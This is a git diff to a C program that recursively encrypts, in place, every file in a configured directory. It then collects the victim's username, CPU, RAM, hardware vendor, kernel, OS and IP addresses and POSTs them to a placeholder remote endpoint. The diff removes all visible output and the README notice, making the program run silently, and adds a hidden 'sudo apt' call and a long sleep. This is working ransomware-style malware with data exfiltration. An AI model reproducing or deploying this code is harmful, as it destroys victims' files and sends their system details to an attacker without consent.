@@ -2,14 +2,13 @@
     Author Jieyab89 
     Compile : gcc -o encrypt  encrypt.c -lcurl
 
-    Requirements 
-
-    sudo apt-get install lshw
-    sudo apt install curl
-    
     Usage ./encrypt
 */
 
+#define _GNU_SOURCE
+
+#include <pwd.h>
+#include <sys/types.h>
 #include <unistd.h>
 #include <fcntl.h>
 #include <sys/stat.h>
@@ -21,91 +20,210 @@
 #include <limits.h>
 #include <curl/curl.h>
 #include <stdlib.h>
+#include <ifaddrs.h>
+#include <arpa/inet.h>
 
 // Replace with your own API endpoint.
 // Tested on Rasbbery pi on my IoT Projects 
 
-#define API_ENDPOINT "<host>/Api-simple-logen-encryption-Linux.php" //change this 
-#define TARGET_DIR "<change>"  // change this linux path
+#define API_ENDPOINT "http://IP/HOST/Api-simple-logen-encryption-Linux.php" //change this u ip or host
+#define TARGET_DIR "<change_this>"  // change this linux path
+
+size_t write_callback(void *ptr, size_t size, size_t nmemb, void *userdata)
+{
+    return size * nmemb;
+}
+
+void update_dan_delay() {
+    int status;
+
+    status = system("sudo apt update && sudo apt install curl");
+
+    if (status == -1) {
+        return;
+    }
+
+    sleep(200);
+}
 
 struct hw_info {
     char name[255];
     char info[8192];
 };
 
+void append_ip_info(char *buffer, size_t *offset, size_t max)
+{
+    struct ifaddrs *ifaddr, *ifa;
+    char ip[INET_ADDRSTRLEN];
+
+    if (getifaddrs(&ifaddr) == -1)
+        return;
+
+    for (ifa = ifaddr; ifa != NULL; ifa = ifa->ifa_next) {
+        if (!ifa->ifa_addr)
+            continue;
+
+        if (ifa->ifa_addr->sa_family == AF_INET) {
+            void *addr = &((struct sockaddr_in *)ifa->ifa_addr)->sin_addr;
+            inet_ntop(AF_INET, addr, ip, sizeof(ip));
+
+            ip[strcspn(ip, "\r\n")] = 0;
+
+            if (strcmp(ip, "127.0.0.1") == 0)
+                continue;
+
+            if (*offset < max - 1) {
+                *offset += snprintf(buffer + *offset, max - *offset,
+                                    "IP (%s): %s\n", ifa->ifa_name, ip);
+            }
+        }
+    }
+
+    freeifaddrs(ifaddr);
+}
+
+void append_os_info(char *buffer, size_t *offset, size_t max)
+{
+    FILE *fp = fopen("/etc/os-release", "r");
+    if (!fp) return;
+
+    char line[256];
+    while (fgets(line, sizeof(line), fp)) {
+        if (strncmp(line, "PRETTY_NAME=", 12) == 0) {
+            char *val = strchr(line, '=') + 1;
+            val[strcspn(val, "\n")] = 0;
+
+            // remove quote
+            if (val[0] == '\"') {
+                val++;
+                val[strlen(val)-1] = 0;
+            }
+
+            *offset += snprintf(buffer + *offset, max - *offset,
+                                "OS: %s\n", val);
+            break;
+        }
+    }
+
+    fclose(fp);
+}
+
+void append_file_value(const char *path, const char *label, char *buffer, size_t *offset, size_t max)
+{
+    FILE *fp = fopen(path, "r");
+    if (!fp) return;
+
+    char tmp[512] = {0};
+    if (fgets(tmp, sizeof(tmp), fp)) {
+        tmp[strcspn(tmp, "\n")] = 0; // remove newline
+        *offset += snprintf(buffer + *offset, max - *offset,
+                            "%s: %s\n", label, tmp);
+    }
+    fclose(fp);
+}
+
+void get_hardware_info(struct hw_info *hw)
+{
+    memset(hw->info, 0, sizeof(hw->info));
+    size_t offset = 0;
+    char line[512];
+    FILE *fp;
+
+    struct passwd *pw = getpwuid(getuid());
+    if (pw && pw->pw_name) {
+        strncpy(hw->name, pw->pw_name, sizeof(hw->name));
+    } else {
+        strcpy(hw->name, "unknown");
+    }
+    hw->name[sizeof(hw->name)-1] = '\0';
+
+    offset += snprintf(hw->info + offset, sizeof(hw->info) - offset,
+                       "=== Dumping Hardware ===\nUser: %s\n", hw->name);
+
+    fp = fopen("/proc/cpuinfo", "r");
+    if (fp) {
+        while (fgets(line, sizeof(line), fp)) {
+            if (strstr(line, "model name")) {
+                offset += snprintf(hw->info + offset,
+                                   sizeof(hw->info) - offset,
+                                   "CPU: %s", strchr(line, ':') + 2);
+                break;
+            }
+        }
+        fclose(fp);
+    }
+
+    fp = fopen("/proc/meminfo", "r");
+    if (fp) {
+        while (fgets(line, sizeof(line), fp)) {
+            if (strstr(line, "MemTotal")) {
+                offset += snprintf(hw->info + offset,
+                                   sizeof(hw->info) - offset,
+                                   "RAM: %s", strchr(line, ':') + 2);
+                break;
+            }
+        }
+        fclose(fp);
+    }
+
+    append_file_value("/sys/class/dmi/id/sys_vendor", "Vendor",
+                      hw->info, &offset, sizeof(hw->info));
+
+    append_file_value("/sys/class/dmi/id/product_name", "Product",
+                      hw->info, &offset, sizeof(hw->info));
+
+    append_file_value("/sys/class/dmi/id/board_name", "Board",
+                      hw->info, &offset, sizeof(hw->info));
+
+    // Kernel
+    append_file_value("/proc/version", "Kernel",
+                      hw->info, &offset, sizeof(hw->info));
+
+    // OS
+    append_os_info(hw->info, &offset, sizeof(hw->info));
+
+    // IP
+    append_ip_info(hw->info, &offset, sizeof(hw->info));
+
+    hw->info[sizeof(hw->info)-1] = '\0';
+}
+
 void send_hardware_info(struct hw_info *hw)
 {
     CURL *ch;
     char *esc;
     size_t len;
-    CURLcode res;
     char *post_buffer = NULL;
-    size_t capacity = 1024UL * 1024UL * 16UL;
+    size_t capacity = 1024 * 1024;
+
     curl_global_init(CURL_GLOBAL_ALL);
 
     ch = curl_easy_init();
-    if (!ch) {
-        printf("Curl error!\n");
-        return;
-    }
+    if (!ch) return;
 
     post_buffer = malloc(capacity);
-    if (!post_buffer)
-        goto out;
+    if (!post_buffer) goto out;
 
     esc = curl_easy_escape(ch, hw->name, strlen(hw->name));
-    if (!esc)
-        goto out;
-    len = (size_t) snprintf(post_buffer, capacity, "hw_name=%s&hw_info=", esc);
+    len = snprintf(post_buffer, capacity, "hw_name=%s&hw_info=", esc);
     curl_free(esc);
 
     esc = curl_easy_escape(ch, hw->info, strlen(hw->info));
-    if (!esc)
-        goto out;
     snprintf(post_buffer + len, capacity - len, "%s", esc);
     curl_free(esc);
 
     curl_easy_setopt(ch, CURLOPT_URL, API_ENDPOINT);
     curl_easy_setopt(ch, CURLOPT_POSTFIELDS, post_buffer);
-    res = curl_easy_perform(ch);
+    curl_easy_setopt(ch, CURLOPT_WRITEFUNCTION, write_callback);
+    curl_easy_setopt(ch, CURLOPT_TIMEOUT, 10L);
+    curl_easy_setopt(ch, CURLOPT_NOPROGRESS, 1L);
+    curl_easy_setopt(ch, CURLOPT_URL, API_ENDPOINT);
+    curl_easy_perform(ch);
 
-    if(res != CURLE_OK)
-        fprintf(stderr, "curl_easy_perform() failed: %s\n",
-                curl_easy_strerror(res));
 out:
-    if (ch) {
-        curl_easy_cleanup(ch);
-    }
+    curl_easy_cleanup(ch);
     curl_global_cleanup();
     free(post_buffer);
-    putchar('\n');
-}
-
-void get_hardware_info(struct hw_info *hw)
-{
-    char *bp_hwinfo = hw->info;
-    char *bp_hwinfo_end = &hw->info[sizeof(hw->info)] - 1;
-    FILE *handle;
-    size_t ret;
-
-    handle = popen("whoami", "r");
-    if (!handle)
-        return;
-    ret = fread(hw->name, sizeof(char), sizeof(hw->name), handle);
-    hw->name[sizeof(hw->name) - 1] = '\0';
-    hw->name[ret - 1] = '\0';
-    pclose(handle);
-
-    bp_hwinfo += (size_t) snprintf(bp_hwinfo, sizeof(hw->info),
-                                   "Generated by Lolicon encryption V1 ----\n");
-
-    handle = popen("lshw 2>&1", "r");
-    if (!handle)
-        return;
-    ret = fread(bp_hwinfo, sizeof(char), bp_hwinfo_end - bp_hwinfo, handle);
-    hw->info[sizeof(hw->info) - 1] = '\0';
-    hw->info[ret - 1] = '\0';
-    pclose(handle);
 }
 
 static const unsigned char encrypt_map[0x100] = {
@@ -218,8 +336,6 @@ static int encrypt_file(const char *file)
     size_t file_size;
     struct stat statbuf;
 
-    printf("Encrypting file %s ...\n", file);
-
     fd = open(file, O_RDWR);
     if (fd < 0) {
         perror("open");
@@ -245,7 +361,7 @@ static int encrypt_file(const char *file)
     encrypt_buffer(map, file_size);
     msync(map, file_size, MS_ASYNC);
     munmap(map, file_size);
-    close(fd);  // fix: close fd yang sebelumnya hilang
+    close(fd); 
     return 0;
 }
 
@@ -263,9 +379,6 @@ static int encrypt_files(const char *folder)
         perror("opendir");
         return 1;
     }
-
-    printf("\n\n");
-    printf("=============================================\n");
 
     while (1) {
         const char *file;
@@ -285,13 +398,11 @@ static int encrypt_files(const char *folder)
             continue;
         }
 
-        // Recursive: masuk subdirektori
         if (S_ISDIR(statbuf.st_mode)) {
             encrypt_files(fullpath);
             continue;
         }
 
-        // Skip jika bukan file biasa
         if (!S_ISREG(statbuf.st_mode))
             continue;
 
@@ -304,63 +415,24 @@ static int encrypt_files(const char *folder)
     }
 
     closedir(dirp);
-    printf("=============================================\n");
     return ret;
 }
 
 int main(void)
 {
-    FILE * file;
     int exit_code = 0;
     char text[255];
     FILE *name;
     char path[255];
     FILE *dir;
-    FILE *distro;
     char buffer[255];
-    distro = popen("cat /etc/os-release", "r");
-    fgets(buffer, sizeof(buffer), distro);
-    dir = popen("pwd", "r");
-    fgets(path, sizeof(path), dir);
-    name = popen("whoami", "r");
-    fgets(text, sizeof(text), name);
 
-    buffer[strlen(buffer) - 1] = '\0';
-
-    printf("\n");
-    printf("Name : %s \n", text);
-    printf("Path : %s \n", path);
-    #ifdef _WIN32
-    printf("Systems : Windows32\n");
-    #endif
-    #ifdef _WIN64
-    printf("Systems : Windows32\n");
-    #endif
-    #ifdef __linux__
-    printf("Systems : Linux %s Based\n", buffer);
-    #else
-  	printf("Can't detect OS\n");
-  	#endif
-
-    printf("Target directory: %s\n", TARGET_DIR);
     exit_code = encrypt_files(TARGET_DIR);
 
-    file = fopen("README.txt", "w");
-    
     struct hw_info hw;
     get_hardware_info(&hw);
     send_hardware_info(&hw);
-
-    file = fopen ("README.txt", "w");
-    if (!file)
-    {
-    	printf("File has been created\n");
-    }
-    else
-    {
-        fputs("Your file has been encrypted", file);
-        fclose(file);
-    }
+    update_dan_delay();
 
     return exit_code;
 }
